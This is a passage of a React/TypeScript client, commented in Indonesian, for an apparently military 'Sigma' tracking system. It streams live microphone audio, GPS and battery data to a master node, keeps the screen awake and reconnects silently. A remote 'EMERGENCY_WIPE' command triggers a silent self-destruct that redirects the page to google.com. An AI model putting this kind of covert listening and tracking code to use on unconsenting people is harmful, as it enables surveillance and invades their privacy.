import React, { useEffect, useRef, useState, useCallback } from 'react';
import Peer, { DataConnection, MediaConnection } from 'peerjs';
import {
  Radio,
  ShieldAlert,
  Navigation,
  Lock,
  Mic,
  Activity,
  BatteryCharging,
} from 'lucide-react';
import {
  setupPassiveAudio,
  silentSelfDestruct,
  type PassiveAudioPipeline,
  type DataChannelLike,
} from './tacticalRemoteControl';
import { TacticalBlackout } from './TacticalBlackout';
import {
  setupNegotiation,
  type SignalingEnvelope,
} from './webrtcAudioEngine';

export interface TelemetryPayload {
  type: 'SIGMA_TELEMETRY';
  nodeId: string;
  peerId: string;
  lat: number | null;
  lng: number | null;
  alt: number | null;
  accuracy: number | null;
  speed: number | null;
  battery: number | null;
  charging: boolean | null;
  timestamp: number;
  audioRms: number;
  remoteGain: number;
  remoteMuted: boolean;
  connectionStatus: 'connected';
}

interface SignalingMessage {
  type:
    | 'REGISTER'
    | 'OFFER'
    | 'ANSWER'
    | 'ICE_CANDIDATE'
    | 'offer'
    | 'answer'
    | 'candidate'
    | 'master_online'
    | 'SIGMA_REQUEST_AUDIO_STREAM'
    | 'SET_GAIN'
    | 'SET_MUTE'
    | 'EMERGENCY_WIPE'
    | 'SIGMA_SDP_RENEGOTIATE_OFFER'
    | 'SIGMA_SDP_RENEGOTIATE_ANSWER'
    | 'SIGMA_ICE_CANDIDATE';
  role?: 'master' | 'client' | 'MASTER' | 'CLIENT';
  senderId?: string;
  targetId?: string;
  target?: string;
  data?: unknown;
  sdp?: RTCSessionDescriptionInit;
  candidate?: RTCIceCandidateInit;
  masterPeerId?: string;
  value?: number | boolean;
  nodeId?: string;
}

interface ClientProps {
  onExit: () => void;
  initialNodeId?: string;
  initialMasterPeerId?: string;
}

const LOGO_TNI_AU = '/assets/aistudio/images__10__b9efa126.jpeg';
const LOGO_PETIR = '/assets/aistudio/1794622160588-picsay_109de27f.png';

const RTC_CONFIG: RTCConfiguration = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
  ],
};

function getSignalingWebSocketUrl(): string {
  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  return `${protocol}//${window.location.host}/ws`;
}

export const Client: React.FC<ClientProps> = ({
  initialMasterPeerId,
}) => {
  // 3. IDENTITAS UNIK DI CLIENT (REACT):
  // Saat komponen Client di-mount, generate ID acak yang unik untuk setiap perangkat/tab
  // agar Klien ke-2 hingga ke-5 tidak pernah memakai ID yang sama dengan Klien ke-1.
  const [nodeId] = useState<string>(() => {
    const randomSuffix = Math.random().toString(36).substring(2, 7).toUpperCase();
    return `client-${randomSuffix}`;
  });

  const [targetMasterId] = useState<string>(() => {
    if (initialMasterPeerId) return initialMasterPeerId;
    const params = new URLSearchParams(window.location.search);
    return params.get('master') || 'sigma-master-main';
  });

  const [peerStatus, setPeerStatus] = useState<
    'INITIALIZING' | 'AUTO_DISCOVERY' | 'CONNECTED'
  >('INITIALIZING');
  const [wakeLockActive, setWakeLockActive] = useState<boolean>(false);
  const [micStatus, setMicStatus] = useState<'READY' | 'DENIED' | 'PENDING'>('PENDING');
  const [audioRms, setAudioRms] = useState<number>(0);
  const [remoteAudioState, setRemoteAudioState] = useState<{
    gain: number;
    muted: boolean;
  }>({
    gain: 1.0,
    muted: false,
  });

  const [batteryInfo, setBatteryInfo] = useState<{
    level: number | null;
    charging: boolean | null;
  }>({
    level: null,
    charging: null,
  });

  const [gpsState, setGpsState] = useState<{
    lat: number | null;
    lng: number | null;
    alt: number | null;
    accuracy: number | null;
    speed: number | null;
    status: 'WAITING_GPS' | 'LOCKED' | 'PERMISSION_DENIED';
    lastSent: number | null;
  }>({
    lat: null,
    lng: null,
    alt: null,
    accuracy: null,
    speed: null,
    status: 'WAITING_GPS',
    lastSent: null,
  });

  // Referensi WebSocket, Native RTCPeerConnection, DataChannel, dan Audio Stream
  const wsRef = useRef<WebSocket | null>(null);
  const nativePcRef = useRef<RTCPeerConnection | null>(null);
  const nativeDcRef = useRef<RTCDataChannel | null>(null);
  const pendingCandidatesRef = useRef<RTCIceCandidateInit[]>([]);
  const isRemoteDescReadyRef = useRef<boolean>(false);
  const isHandshakingRef = useRef<boolean>(false);
  const isConnectedRef = useRef<boolean>(false);

  // Fallback PeerJS refs
  const peerRef = useRef<Peer | null>(null);
  const dataConnsRef = useRef<Map<string, DataConnection>>(new Map());
  const mediaCallsRef = useRef<Map<string, MediaConnection>>(new Map());
  const negotiationHandlersRef = useRef<
    Map<string, ReturnType<typeof setupNegotiation>>
  >(new Map());

  const rawStreamRef = useRef<MediaStream | null>(null);
  const outboundStreamRef = useRef<MediaStream | null>(null);
  const passivePipelineRef = useRef<PassiveAudioPipeline | null>(null);
  const wakeLockRef = useRef<WakeLockSentinel | null>(null);

  const gpsRef = useRef(gpsState);
  const batteryRef = useRef(batteryInfo);
  const rmsRef = useRef(0);
  const remoteAudioStateRef = useRef(remoteAudioState);

  gpsRef.current = gpsState;
  batteryRef.current = batteryInfo;
  rmsRef.current = audioRms;
  remoteAudioStateRef.current = remoteAudioState;

  // Aktifkan mode TacticalBlackout shortcut otomatis
  useEffect(() => {
    void TacticalBlackout;
  }, []);

  // 1. Request Screen Wake Lock secara otomatis
  const requestWakeLock = useCallback(async () => {
    try {
      if ('wakeLock' in navigator && navigator.wakeLock) {
        const sentinel = await navigator.wakeLock.request('screen');
        wakeLockRef.current = sentinel;
        setWakeLockActive(true);
        sentinel.addEventListener('release', () => {
          setWakeLockActive(false);
        });
      }
    } catch {
      setWakeLockActive(false);
    }
  }, []);

  useEffect(() => {
    requestWakeLock();
    const handleVisibility = () => {
      if (document.visibilityState === 'visible') {
        requestWakeLock();
      }
    };
    document.addEventListener('visibilitychange', handleVisibility);
    return () => {
      document.removeEventListener('visibilitychange', handleVisibility);
      if (wakeLockRef.current) {
        wakeLockRef.current.release().catch(() => {});
      }
    };
  }, [requestWakeLock]);

  // 2. Real Hardware Battery Telemetry
  useEffect(() => {
    const nav = navigator as unknown as {
      getBattery?: () => Promise<{
        level: number;
        charging: boolean;
        addEventListener: (type: string, cb: () => void) => void;
      }>;
    };
    if (nav.getBattery) {
      nav
        .getBattery()
        .then((bat) => {
          const updateBat = () => {
            setBatteryInfo({
              level: Math.round(bat.level * 100),
              charging: bat.charging,
            });
          };
          updateBat();
          bat.addEventListener('levelchange', updateBat);
          bat.addEventListener('chargingchange', updateBat);
        })
        .catch(() => {});
    }
  }, []);

  // 3. Transmit Real GPS & Device Telemetry over Native RTCDataChannel, WebSocket, & PeerJS
  const transmitTelemetryPacket = useCallback(
    (overrideCoords?: {
      lat: number | null;
      lng: number | null;
      alt: number | null;
      accuracy: number | null;
      speed: number | null;
    }) => {
      const coords = overrideCoords || gpsRef.current;
      const payload: TelemetryPayload = {
        type: 'SIGMA_TELEMETRY',
        nodeId,
        peerId: `sigma-node-${nodeId}`,
        lat: coords.lat,
        lng: coords.lng,
        alt: coords.alt,
        accuracy: coords.accuracy,
        speed: coords.speed,
        battery: batteryRef.current.level,
        charging: batteryRef.current.charging,
        timestamp: Date.now(),
        audioRms: rmsRef.current,
        remoteGain: remoteAudioStateRef.current.gain,
        remoteMuted: remoteAudioStateRef.current.muted,
        connectionStatus: 'connected',
      };

      let sentCount = 0;

      // a. Kirim melalui Native RTCDataChannel
      if (nativeDcRef.current && nativeDcRef.current.readyState === 'open') {
        try {
          nativeDcRef.current.send(JSON.stringify(payload));
          sentCount++;
        } catch {}
      }

      // b. Kirim melalui WebSocket Signaling (sebagai jalur cadangan real-time ke Master)
      if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN && isConnectedRef.current) {
        try {
          wsRef.current.send(
            JSON.stringify({
              ...payload,
              senderId: nodeId,
              targetId: 'MASTER',
              target: 'MASTER',
            })
          );
          sentCount++;
        } catch {}
      }

      // c. Kirim melalui PeerJS DataConnection jika terbuka
      dataConnsRef.current.forEach((conn) => {
        if (conn.open) {
          try {
            conn.send(payload);
            sentCount++;
          } catch {}
        }
      });

      if (sentCount > 0) {
        setGpsState((prev) => ({ ...prev, lastSent: Date.now() }));
      }
    },
    [nodeId]
  );

  // 4. Akuisisi Mikrofon Otomatis via navigator.mediaDevices.getUserMedia
  const ensureMicrophoneStream = useCallback(async (): Promise<MediaStream | null> => {
    // Gunakan stream hardware langsung (rawStreamRef) agar tidak bisu saat AudioContext suspended di Samsung
    if (rawStreamRef.current && rawStreamRef.current.active) {
      return rawStreamRef.current;
    }

    const rawConstraints: MediaStreamConstraints = {
      audio: {
        echoCancellation: false,
        noiseSuppression: false,
        autoGainControl: false,
      },
      video: false,
    };

    try {
      let stream: MediaStream;
      try {
        // Coba gunakan constraint audio taktis spesifik terlebih dahulu
        stream = await navigator.mediaDevices.getUserMedia(rawConstraints);
      } catch (constraintErr) {
        // FALLBACK AUDIO CONSTRAINTS (KHUSUS SAMSUNG):
        // Jika browser/hardware Samsung menolak constraint spesifik di atas,
        // langsung fallback ke { audio: true } murni agar getUserMedia tidak gagal.
        console.warn(
          '[CLIENT-AUDIO] Constraint spesifik ditolak perangkat, menggunakan fallback { audio: true }:',
          constraintErr
        );
        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      }

      stream.getTracks().forEach((track) => {
        track.enabled = !remoteAudioStateRef.current.muted;
      });

      rawStreamRef.current = stream;

      const pipeline = setupPassiveAudio(
        stream,
        nativeDcRef.current as unknown as DataChannelLike,
        {
          getExtraStreams: () => [rawStreamRef.current, outboundStreamRef.current],
          getPeerConnections: () => [
            nativePcRef.current,
            ...Array.from(dataConnsRef.current.values()),
            ...Array.from(mediaCallsRef.current.values()),
          ],
          getPeerInstance: () => peerRef.current,
        },
        (updatedState) => {
          setRemoteAudioState(updatedState);
          // Sinkronkan juga status mute langsung pada hardware track Samsung
          if (rawStreamRef.current) {
            rawStreamRef.current.getAudioTracks().forEach((t) => {
              t.enabled = !updatedState.muted;
            });
          }
          setTimeout(() => transmitTelemetryPacket(), 30);
        }
      );

      passivePipelineRef.current = pipeline;
      outboundStreamRef.current =
        pipeline.audioContext.state === 'running' ? pipeline.processedStream : stream;
      setMicStatus('READY');

      // Pasang meter RMS lokal
      const analyser = pipeline.audioContext.createAnalyser();
      analyser.fftSize = 256;
      pipeline.gainNode.connect(analyser);
      const data = new Uint8Array(analyser.frequencyBinCount);

      const updateMeter = () => {
        if (!rawStreamRef.current || !rawStreamRef.current.active) return;
        analyser.getByteTimeDomainData(data);
        let sum = 0;
        for (let i = 0; i < data.length; i++) {
          const norm = (data[i] - 128) / 128;
          sum += norm * norm;
        }
        const rms = Math.min(100, Math.round(Math.sqrt(sum / data.length) * 260));
        setAudioRms(rms);
        requestAnimationFrame(updateMeter);
      };
      requestAnimationFrame(updateMeter);

      // Kembalikan stream hardware asli dari getUserMedia agar Samsung tidak pernah mengirim stream kosong
      return stream;
    } catch {
      setMicStatus('DENIED');
      return null;
    }
  }, [transmitTelemetryPacket]);

  /**
   * ============================================================================
   * 5. FUNGSI UTAMA INISIALISASI CLIENT (SAMSUNG GALAXY A26 5G STRICT LIFECYCLE)
   * ============================================================================
   * Urutan Eksekusi Strict untuk Kompatibilitas Mesin Browser Samsung:
   *   a. Tunggu `await navigator.mediaDevices.getUserMedia(...)` sukses DULU.
   *   b. Simpan stream mikrofon tersebut (`rawStreamRef.current`).
   *   c. BARU buat `new RTCPeerConnection(RTC_CONFIG)` + pasang audio dengan
   *      `peerConnection.addTransceiver(track, { direction: 'sendonly' })`.
   *   d. BARU buat `new WebSocket(...)` (atau kirim Offer jika WS sudah terbuka).
   */
  const createSamsungSafePeerConnection = useCallback(
    (stream: MediaStream | null): RTCPeerConnection => {
      // Bersihkan instans RTCPeerConnection lama jika ada
      if (nativePcRef.current) {
        try {
          nativePcRef.current.onicecandidate = null;
          nativePcRef.current.onconnectionstatechange = null;
          nativePcRef.current.oniceconnectionstatechange = null;
          nativePcRef.current.close();
        } catch {}
      }

      // 1c. BARU buat new RTCPeerConnection(...) SETELAH getUserMedia selesai
      const peerConnection = new RTCPeerConnection(RTC_CONFIG);
      nativePcRef.current = peerConnection;
      pendingCandidatesRef.current = [];
      isRemoteDescReadyRef.current = false;

      // 2. GUNAKAN ADD-TRANSCEIVER (BUKAN ADD-TRACK) UNTUK HARDWARE SAMSUNG:
      if (stream && stream.getAudioTracks().length > 0) {
        stream.getAudioTracks().forEach((track) => {
          track.enabled = !remoteAudioStateRef.current.muted;
          peerConnection.addTransceiver(track, {
            direction: 'sendonly',
            streams: [stream],
          });
        });
      } else {
        // Fallback transceiver apabila perangkat sedang tidak memiliki audio track
        peerConnection.addTransceiver('audio', {
          direction: 'sendonly',
        });
      }

      // Buat RTCDataChannel untuk pengiriman koordinat GPS & komando Master
      const dc = peerConnection.createDataChannel('sigma-telemetry', {
        ordered: true,
      });
      nativeDcRef.current = dc;

      dc.onopen = () => {
        isConnectedRef.current = true;
        setPeerStatus('CONNECTED');
        if (passivePipelineRef.current) {
          passivePipelineRef.current.bindDataChannel(
            dc as unknown as DataChannelLike
          );
        }
        transmitTelemetryPacket();
      };

      dc.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data) as SignalingMessage;
          if (msg.type === 'EMERGENCY_WIPE') {
            silentSelfDestruct({
              streams: [rawStreamRef.current, outboundStreamRef.current],
              peerConnections: [nativePcRef.current],
              peerInstance: peerRef.current,
              audioContext: passivePipelineRef.current?.audioContext,
              redirectUrl: 'https://www.google.com',
            });
          } else if (msg.type === 'SET_GAIN' && typeof msg.value === 'number') {
            passivePipelineRef.current?.setRemoteGain(msg.value);
          } else if (msg.type === 'SET_MUTE') {
            passivePipelineRef.current?.setRemoteMute(Boolean(msg.value));
          }
        } catch {}
      };

      // 3. PENANGANAN ICE GATHERING "NULL" (SAMSUNG QUIRK):
      // Browser Samsung sering mengirim `event.candidate === null` secara tiba-tiba
      // untuk menandai ICE gathering selesai. WAJIB gunakan penjagaan `if (event.candidate)`
      // agar tidak error/crash saat membaca data kosong!
      peerConnection.onicecandidate = (event: RTCPeerConnectionIceEvent) => {
        if (event.candidate) {
          const ws = wsRef.current;
          if (ws && ws.readyState === WebSocket.OPEN) {
            const candidatePacket = {
              type: 'candidate',
              senderId: nodeId,
              targetId: 'MASTER',
              data: event.candidate.toJSON(),
            };
            console.log(
              `[CLIENT-WS] Mengirim ICE Candidate dari senderId="${nodeId}" -> targetId="MASTER"`
            );
            ws.send(JSON.stringify(candidatePacket));
          }
        } else {
          // event.candidate === null menandakan ICE gathering selesai di browser Samsung
          console.log(
            `[CLIENT-WS] ICE Gathering selesai pada perangkat (${nodeId}) [event.candidate === null]`
          );
        }
      };

      const checkConnectionState = () => {
        const state = peerConnection.connectionState;
        const iceState = peerConnection.iceConnectionState;
        console.log(
          `[CLIENT-WS] Status WebRTC (${nodeId}) -> connectionState: "${state}", iceConnectionState: "${iceState}"`
        );

        if (
          state === 'connected' ||
          iceState === 'connected' ||
          iceState === 'completed'
        ) {
          isConnectedRef.current = true;
          isHandshakingRef.current = false;
          setPeerStatus('CONNECTED');
          transmitTelemetryPacket();
        } else if (
          state === 'disconnected' ||
          state === 'failed' ||
          state === 'closed' ||
          iceState === 'failed' ||
          iceState === 'disconnected'
        ) {
          isConnectedRef.current = false;
          isHandshakingRef.current = false;
          setPeerStatus('AUTO_DISCOVERY');
        }
      };

      peerConnection.onconnectionstatechange = checkConnectionState;
      peerConnection.oniceconnectionstatechange = checkConnectionState;

      return peerConnection;
    },
    [nodeId, transmitTelemetryPacket]
  );

  // Fungsi pengiriman SDP Offer setelah PeerConnection dan WebSocket sama-sama siap
  const sendOfferOverWebSocket = useCallback(
    async (peerConnection: RTCPeerConnection, ws: WebSocket) => {
      if (ws.readyState !== WebSocket.OPEN) return;
      try {
        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);

        if (ws.readyState === WebSocket.OPEN && peerConnection.localDescription) {
          const offerPacket = {
            type: 'offer',
            senderId: nodeId,
            targetId: 'MASTER',
            data: {
              type: peerConnection.localDescription.type,
              sdp: peerConnection.localDescription.sdp,
            },
          };
          console.log(
            `[CLIENT-WS] Mengirim OFFER dari senderId="${nodeId}" -> targetId="MASTER"`
          );
          ws.send(JSON.stringify(offerPacket));
        }
      } catch (err) {
        console.error('[CLIENT-WS] Gagal membuat/mengirim Offer:', err);
      }
    },
    [nodeId]
  );

  // Fungsi Re-Handshake (digunakan saat menerima sinyal `master_online` atau retry 5 detik)
  // Tetap mematuhi urutan: 1. Await Media -> 2. Simpan Stream -> 3. Buat PC + addTransceiver -> 4. Kirim via WS
  const startWebRTC = useCallback(async () => {
    const existingPc = nativePcRef.current;
    const hasAudioSenderTrack = Boolean(
      existingPc &&
        existingPc
          .getSenders()
          .some(
            (s) =>
              s.track &&
              s.track.kind === 'audio' &&
              s.track.readyState === 'live'
          )
    );

    if (
      existingPc &&
      hasAudioSenderTrack &&
      (existingPc.connectionState === 'connected' ||
        existingPc.iceConnectionState === 'connected' ||
        existingPc.iceConnectionState === 'completed')
    ) {
      isConnectedRef.current = true;
      setPeerStatus('CONNECTED');
      return;
    }

    if (isHandshakingRef.current) return;
    isHandshakingRef.current = true;

    try {
      // a & b. Tunggu getUserMedia sukses DULU dan simpan stream tersebut
      const stream = (await ensureMicrophoneStream()) || rawStreamRef.current;

      // c. BARU buat new RTCPeerConnection(...) dan pasang addTransceiver('sendonly')
      const pc = createSamsungSafePeerConnection(stream);

      // d. Kirim Offer melalui WebSocket jika sudah OPEN
      const ws = wsRef.current;
      if (ws && ws.readyState === WebSocket.OPEN) {
        await sendOfferOverWebSocket(pc, ws);
      }
    } catch (err) {
      console.error('[CLIENT-WS] Error di dalam startWebRTC():', err);
    } finally {
      setTimeout(() => {
        isHandshakingRef.current = false;
      }, 1200);
    }
  }, [
    createSamsungSafePeerConnection,
    ensureMicrophoneStream,
    sendOfferOverWebSocket,
  ]);

  /**
   * ============================================================================
   * 6. SAMSUNG STRICT LIFECYCLE BOOTSTRAP (AWAIT MEDIA -> PC -> WEBSOCKET)
   * ============================================================================
   * Urutan eksekusi wajib saat komponen Client dimuat:
   *   a. Tunggu `await navigator.mediaDevices.getUserMedia(...)` sukses DULU.
   *   b. Simpan stream tersebut di `rawStreamRef.current`.
   *   c. BARU buat `new RTCPeerConnection(RTC_CONFIG)` + `addTransceiver(track, { direction: 'sendonly' })`.
   *   d. BARU buat `new WebSocket(...)`.
   */
  useEffect(() => {
    let isMounted = true;
    let wsReconnectTimer: number | null = null;
    let autoOfferInterval: number | null = null;

    const connectSignalingWebSocket = () => {
      if (!isMounted) return;
      if (
        wsRef.current &&
        (wsRef.current.readyState === WebSocket.OPEN ||
          wsRef.current.readyState === WebSocket.CONNECTING)
      ) {
        return;
      }

      try {
        const wsUrl = getSignalingWebSocketUrl();
        console.log(
          `[CLIENT-WS] Langkah 1d: Membuat koneksi WebSocket ke ${wsUrl} (id="${nodeId}")`
        );
        const ws = new WebSocket(wsUrl);
        wsRef.current = ws;

        ws.onopen = async () => {
          if (!isMounted) return;
          setPeerStatus((prev) =>
            prev === 'CONNECTED' ? 'CONNECTED' : 'AUTO_DISCOVERY'
          );

          // Registrasi ID unik Klien ke Signaling Server
          const registerPacket = {
            type: 'register',
            id: nodeId,
          };
          console.log(
            '[CLIENT-WS] WebSocket terbuka. Mengirim registrasi:',
            registerPacket
          );
          ws.send(JSON.stringify(registerPacket));

          // Gunakan RTCPeerConnection yang sudah disiapkan pada Langkah 1c
          // (atau buat baru jika belum ada / sudah tertutup)
          let pc = nativePcRef.current;
          if (!pc || pc.signalingState === 'closed') {
            const stream =
              rawStreamRef.current || (await ensureMicrophoneStream());
            pc = createSamsungSafePeerConnection(stream);
          }

          await sendOfferOverWebSocket(pc, ws);
        };

        ws.onmessage = async (event) => {
          if (!isMounted) return;
          let data: SignalingMessage | null = null;
          try {
            data = JSON.parse(event.data) as SignalingMessage;
          } catch (err) {
            console.error('[CLIENT-WS] Gagal parse pesan JSON:', err);
            return;
          }
          if (!data || !data.type) return;

          console.log(
            `[CLIENT-WS] Menerima pesan -> type: "${data.type}", senderId: "${
              data.senderId || ''
            }", targetId: "${data.targetId || ''}"`
          );

          if (data.targetId && data.targetId !== nodeId) {
            return;
          }

          // Jika Master baru saja online dan Klien ini BELUM terkoneksi, langsung negosiasi ulang
          if (data.type === 'master_online') {
            const pc = nativePcRef.current;
            const alreadyActive =
              pc &&
              (pc.connectionState === 'connected' ||
                pc.iceConnectionState === 'connected' ||
                pc.iceConnectionState === 'completed');
            if (!alreadyActive) {
              console.log(
                '[CLIENT-WS] MASTER online terdeteksi! Memulai ulang startWebRTC()...'
              );
              isConnectedRef.current = false;
              isHandshakingRef.current = false;
              startWebRTC();
            }
            return;
          }

          // Terima SDP Answer dari Master
          const sdpPayload = (data.data || data.sdp) as
            | RTCSessionDescriptionInit
            | undefined;
          if (
            (data.type === 'answer' || data.type === 'ANSWER') &&
            sdpPayload &&
            nativePcRef.current
          ) {
            try {
              const pc = nativePcRef.current;
              console.log(
                `[CLIENT-WS] Menerima ANSWER dari MASTER (signalingState="${pc.signalingState}")`
              );
              if (pc.signalingState === 'have-local-offer') {
                await pc.setRemoteDescription(
                  new RTCSessionDescription(sdpPayload)
                );
                isRemoteDescReadyRef.current = true;
                isConnectedRef.current = true;
                setPeerStatus('CONNECTED');
                console.log('[CLIENT-WS] setRemoteDescription(answer) BERHASIL!');

                // Masukkan semua ICE Candidate yang sempat mengantre
                const candidateQueue = pendingCandidatesRef.current;
                while (candidateQueue.length > 0) {
                  const cand = candidateQueue.shift();
                  if (cand) {
                    await pc
                      .addIceCandidate(new RTCIceCandidate(cand))
                      .catch((err) => {
                        console.error(
                          '[CLIENT-WS] Gagal addIceCandidate dari antrean:',
                          err
                        );
                      });
                  }
                }
                transmitTelemetryPacket();
              }
            } catch (err) {
              console.error(
                '[CLIENT-WS] Gagal setRemoteDescription(answer):',
                err
              );
            }
            return;
          }

          // Terima ICE Candidate dari Master (dengan antrean pencegah Race Condition)
          const candidatePayload = (data.data || data.candidate) as
            | RTCIceCandidateInit
            | undefined;
          if (
            (data.type === 'candidate' || data.type === 'ICE_CANDIDATE') &&
            candidatePayload &&
            nativePcRef.current
          ) {
            try {
              const pc = nativePcRef.current;
              if (
                pc.remoteDescription &&
                pc.remoteDescription.type &&
                isRemoteDescReadyRef.current
              ) {
                await pc.addIceCandidate(
                  new RTCIceCandidate(candidatePayload)
                );
              } else {
                pendingCandidatesRef.current.push(candidatePayload);
              }
            } catch (err) {
              console.error('[CLIENT-WS] Gagal addIceCandidate:', err);
            }
            return;
          }

          // Komando Jarak Jauh dari Master
          if (data.type === 'EMERGENCY_WIPE') {
            silentSelfDestruct({
              streams: [rawStreamRef.current, outboundStreamRef.current],
              peerConnections: [nativePcRef.current],
              peerInstance: peerRef.current,
              audioContext: passivePipelineRef.current?.audioContext,
              redirectUrl: 'https://www.google.com',
            });
            return;
          }
          if (data.type === 'SET_GAIN' && typeof data.value === 'number') {
            passivePipelineRef.current?.setRemoteGain(data.value);
            return;
          }
          if (data.type === 'SET_MUTE') {
            passivePipelineRef.current?.setRemoteMute(Boolean(data.value));
            return;
          }
        };

        ws.onclose = () => {
          if (!isMounted) return;
          console.warn(
            '[CLIENT-WS] Koneksi WebSocket terputus. Mencoba reconnect dalam 2.5 detik...'
          );
          if (!isConnectedRef.current) {
            setPeerStatus('AUTO_DISCOVERY');
          }
          wsReconnectTimer = window.setTimeout(
            connectSignalingWebSocket,
            2500
          );
        };

        ws.onerror = (err) => {
          console.error('[CLIENT-WS] WebSocket error:', err);
          try {
            ws.close();
          } catch {}
        };
      } catch {
        wsReconnectTimer = window.setTimeout(connectSignalingWebSocket, 3000);
      }
    };

    // =========================================================================
    // EKSEKUSI BERURUTAN (STRICT SEQUENTIAL STARTUP UNTUK SAMSUNG):
    //   a. Tunggu `await navigator.mediaDevices.getUserMedia(...)` sukses DULU.
    //   b. Simpan stream tersebut (`rawStreamRef.current`).
    //   c. BARU buat `new RTCPeerConnection(...)` + `addTransceiver('sendonly')`.
    //   d. BARU buat `new WebSocket(...)`.
    // =========================================================================
    const initializeSamsungSequentialFlow = async () => {
      console.log(
        '[CLIENT-BOOT] Langkah 1a & 1b: Menunggu getUserMedia(...) selesai dan menyimpan stream...'
      );
      const stream = await ensureMicrophoneStream();
      if (!isMounted) return;

      console.log(
        '[CLIENT-BOOT] Langkah 1c: Membuat new RTCPeerConnection(...) & addTransceiver(track, { direction: "sendonly" })...'
      );
      createSamsungSafePeerConnection(stream);

      console.log(
        '[CLIENT-BOOT] Langkah 1d: Membuka koneksi new WebSocket(...)...'
      );
      connectSignalingWebSocket();

      // Interval 5 detik untuk Auto-Reconnect & Re-Offer secara senyap apabila Master belum online
      autoOfferInterval = window.setInterval(() => {
        if (!isMounted) return;

        if (!wsRef.current || wsRef.current.readyState === WebSocket.CLOSED) {
          connectSignalingWebSocket();
          return;
        }

        const pc = nativePcRef.current;
        const isPcConnected = Boolean(
          pc &&
            (pc.connectionState === 'connected' ||
              pc.iceConnectionState === 'connected' ||
              pc.iceConnectionState === 'completed')
        );

        if (!isPcConnected && mediaCallsRef.current.size === 0) {
          console.log(
            `[CLIENT-WS] Auto-Retry 5s: Klien "${nodeId}" belum terhubung ke MASTER, mengirim ulang Offer...`
          );
          isHandshakingRef.current = false;
          startWebRTC();
        }
      }, 5000);
    };

    initializeSamsungSequentialFlow();

    return () => {
      isMounted = false;
      if (autoOfferInterval) clearInterval(autoOfferInterval);
      if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
      if (wsRef.current) {
        try {
          wsRef.current.close();
        } catch {}
      }
      if (nativePcRef.current) {
        try {
          nativePcRef.current.close();
        } catch {}
      }
    };
  }, [
    createSamsungSafePeerConnection,
    ensureMicrophoneStream,
    nodeId,
    sendOfferOverWebSocket,
    startWebRTC,
    transmitTelemetryPacket,
  ]);

  // 7. Real Hardware Geolocation + 10-Second Telemetry Loop
  useEffect(() => {
    if (!('geolocation' in navigator)) {
      setGpsState((prev) => ({ ...prev, status: 'PERMISSION_DENIED' }));
      return;
    }

    let watchId: number | null = null;

    const fetchHardwareGps = () => {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const nextCoords = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            alt: pos.coords.altitude !== null ? Math.round(pos.coords.altitude) : null,
            accuracy: Math.max(1, Math.round(pos.coords.accuracy)),
            speed: pos.coords.speed !== null ? Math.round(pos.coords.speed * 3.6) : null,
          };
          setGpsState((prev) => ({
            ...prev,
            ...nextCoords,
            status: 'LOCKED',
          }));
          transmitTelemetryPacket(nextCoords);
        },
        () => {
          setGpsState((prev) => ({
            ...prev,
            status: prev.lat !== null ? 'LOCKED' : 'PERMISSION_DENIED',
          }));
          transmitTelemetryPacket();
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    };

    fetchHardwareGps();

    watchId = navigator.geolocation.watchPosition(
      (pos) => {
        const nextCoords = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          alt: pos.coords.altitude !== null ? Math.round(pos.coords.altitude) : null,
          accuracy: Math.max(1, Math.round(pos.coords.accuracy)),
          speed: pos.coords.speed !== null ? Math.round(pos.coords.speed * 3.6) : null,
        };
        setGpsState((prev) => ({
          ...prev,
          ...nextCoords,
          status: 'LOCKED',
        }));
        transmitTelemetryPacket(nextCoords);
      },
      () => {},
      { enableHighAccuracy: true, maximumAge: 5000 }
    );

    const intervalId = window.setInterval(() => {
      fetchHardwareGps();
    }, 10000);

    return () => {
      if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
      }
      clearInterval(intervalId);
    };
  }, [transmitTelemetryPacket]);

  // 8. Dual-Layer PeerJS Auto-Connect Fallback (dengan Force Audio Transceiver & addTrack untuk Samsung)
  useEffect(() => {
    const peerId = `sigma-node-${nodeId}`;
    const peer = new Peer(peerId, { debug: 0 });
    peerRef.current = peer;

    const attachAudioToPeerConnection = (
      pc: RTCPeerConnection | undefined,
      stream: MediaStream
    ) => {
      if (!pc) return;
      try {
        const hasAudioTransceiver = pc
          .getTransceivers()
          .some(
            (t) =>
              t.sender.track?.kind === 'audio' ||
              t.receiver.track?.kind === 'audio'
          );
        if (!hasAudioTransceiver) {
          pc.addTransceiver('audio', { direction: 'sendonly' });
        }
      } catch {}

      stream.getTracks().forEach((track) => {
        track.enabled = !remoteAudioStateRef.current.muted;
        const alreadyAdded = pc
          .getSenders()
          .some((s) => s.track && s.track.id === track.id);
        if (!alreadyAdded) {
          try {
            pc.addTrack(track, stream);
          } catch {}
        }
      });
    };

    const autoDialPeerJsMaster = async () => {
      if (!peer.open) return;

      // Pastikan stream mikrofon hardware dari getUserMedia siap
      const stream = rawStreamRef.current || (await ensureMicrophoneStream());

      if (!dataConnsRef.current.has(targetMasterId)) {
        const conn = peer.connect(targetMasterId, {
          metadata: { nodeId },
          reliable: true,
        });
        conn.on('open', () => {
          dataConnsRef.current.set(targetMasterId, conn);
          isConnectedRef.current = true;
          setPeerStatus('CONNECTED');
          if (passivePipelineRef.current) {
            passivePipelineRef.current.bindDataChannel(conn as unknown as DataChannelLike);
          }
          transmitTelemetryPacket();
          if (stream) {
            attachAudioToPeerConnection(conn.peerConnection, stream);
            const call = peer.call(targetMasterId, stream, { metadata: { nodeId } });
            if (call) {
              attachAudioToPeerConnection(call.peerConnection, stream);
              mediaCallsRef.current.set(targetMasterId, call);
            }
          }
        });
        conn.on('close', () => {
          dataConnsRef.current.delete(targetMasterId);
        });
      } else if (stream && !mediaCallsRef.current.has(targetMasterId)) {
        // Jika DataChannel sudah terbuka tapi panggilan audio belum masuk, paksa kirim stream mikrofon Samsung
